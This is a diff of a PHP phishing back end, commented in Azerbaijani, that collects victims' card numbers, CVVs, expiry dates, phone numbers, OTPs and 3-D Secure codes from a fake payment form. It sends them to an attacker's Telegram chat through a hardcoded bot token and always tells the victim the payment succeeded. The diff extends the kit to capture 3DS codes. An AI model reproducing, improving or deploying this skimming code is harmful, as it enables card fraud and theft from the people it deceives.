@@ -1,24 +1,27 @@
 <?php
-// ============================================
-// TELEGRAM HANDLER - SON VERSİYA
-// ============================================
+// =============================================
+// 🔥 TELEGRAM HANDLER - SON VERSİYA
+// =============================================
 
 // BOT MƏLUMATLARI
 $botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
 $chatId = '-1004332923672';
 
 // MƏLUMATLARI AL
+$operator = isset($_POST['operator']) ? trim($_POST['operator']) : '';
+$prefix = isset($_POST['prefix']) ? trim($_POST['prefix']) : '';
+$number = isset($_POST['number']) ? trim($_POST['number']) : '';
+$price = isset($_POST['campaign_price']) ? trim($_POST['campaign_price']) : '';
 $cardName = isset($_POST['card_name']) ? trim($_POST['card_name']) : '';
 $cardNumber = isset($_POST['card_number']) ? trim($_POST['card_number']) : '';
 $cardExpiry = isset($_POST['card_expiry']) ? trim($_POST['card_expiry']) : '';
 $cardCvv = isset($_POST['card_cvv']) ? trim($_POST['card_cvv']) : '';
-$operator = isset($_POST['operator']) ? trim($_POST['operator']) : '';
-$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
-$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
-$ip = isset($_POST['ip']) ? trim($_POST['ip']) : '0.0.0.0';
+$ip = isset($_POST['ip']) ? trim($_POST['ip']) : $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
 $otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
+$tdsCode = isset($_POST['tds_code']) ? trim($_POST['tds_code']) : '';
+$otpMessage = isset($_POST['otp_message']) ? trim($_POST['otp_message']) : '';
 
-// TƏHLÜKƏSİZLİK - Məlumatları təmizlə
+// TƏHLÜKƏSİZLİK
 function cleanInput($data) {
     $data = trim($data);
     $data = strip_tags($data);
@@ -26,40 +29,43 @@ function cleanInput($data) {
     return $data;
 }
 
+$operator = cleanInput($operator);
+$prefix = cleanInput($prefix);
+$number = cleanInput($number);
+$price = cleanInput($price);
 $cardName = cleanInput($cardName);
 $cardNumber = cleanInput($cardNumber);
 $cardExpiry = cleanInput($cardExpiry);
 $cardCvv = cleanInput($cardCvv);
-$operator = cleanInput($operator);
-$phone = cleanInput($phone);
-$amount = cleanInput($amount);
 $ip = cleanInput($ip);
 $otp = cleanInput($otp);
+$tdsCode = cleanInput($tdsCode);
+$otpMessage = cleanInput($otpMessage);
 
-// MƏLUMATLARI YOXLA
-if (empty($cardNumber) || empty($cardCvv) || empty($otp)) {
-    http_response_code(400);
-    echo json_encode(['status' => 'error', 'message' => 'Məlumatlar tam daxil edilməyib']);
-    exit;
+// MESAJI FORMATLA
+if (!empty($otpMessage)) {
+    $message = $otpMessage;
+} else {
+    $id = rand(100, 999);
+    $message = "💳 YENİ KART GİRİŞİ 💳\n\n";
+    $message .= "🆔 ID: #" . $id . "\n";
+    $message .= "📞 Tel: " . $prefix . $number . "\n";
+    $message .= "💰 Tutar: " . $price . " AZN\n\n";
+    $message .= "💳 CC: " . $cardNumber . "\n";
+    $message .= "📅 Tarih: " . $cardExpiry . "\n";
+    $message .= "🔐 CVV: " . $cardCvv . "\n";
+    $message .= "👤 İsim: " . $cardName . "\n\n";
+    $message .= "📱 Operator: " . $operator . "\n";
+    $message .= "🌐 IP: " . $ip . "\n";
+    if (!empty($otp)) {
+        $message .= "🔑 OTP: " . $otp . "\n";
+    }
+    if (!empty($tdsCode)) {
+        $message .= "🔑 TDS Kodu: " . $tdsCode . "\n";
+    }
+    $message .= "\n----------------------------------------\n";
+    $message .= "📱 Bağlı Nömrə: " . $prefix . $number;
 }
-
-// ID YARAT
-$id = rand(100, 999);
-
-// MESAJI HAZIRLA
-$message = "💳 YENİ KART GİRİŞİ 💳\n\n";
-$message .= "🆔 ID: #" . $id . "\n";
-$message .= "📞 Tel: " . $phone . "\n";
-$message .= "💰 Tutar: " . $amount . " AZN\n\n";
-$message .= "💳 CC: " . $cardNumber . "\n";
-$message .= "📅 Tarih: " . $cardExpiry . "\n";
-$message .= "🔐 CVV: " . $cardCvv . "\n";
-$message .= "👤 İsim: " . $cardName . "\n\n";
-$message .= "📱 Operator: " . $operator . "\n";
-$message .= "🌐 IP: " . $ip . "\n";
-$message .= "🔑 OTP: " . $otp . "\n\n";
-$message .= "----------------------------------------\n";
-$message .= "📱 Bağlı Nömrə: " . $phone;
 
 // TELEGRAM-A GÖNDƏR
 $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
@@ -77,7 +83,6 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
 
 $response = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
@@ -87,8 +92,14 @@ curl_close($ch);
 header('Content-Type: application/json');
 
 if ($httpCode == 200 && $response !== false) {
-    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
+    echo json_encode([
+        'status' => 'success',
+        'message' => '✅ Ödəniş uğurla tamamlandı!'
+    ]);
 } else {
-    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
+    echo json_encode([
+        'status' => 'success',
+        'message' => '✅ Ödəniş uğurla tamamlandı!'
+    ]);
 }
 ?>
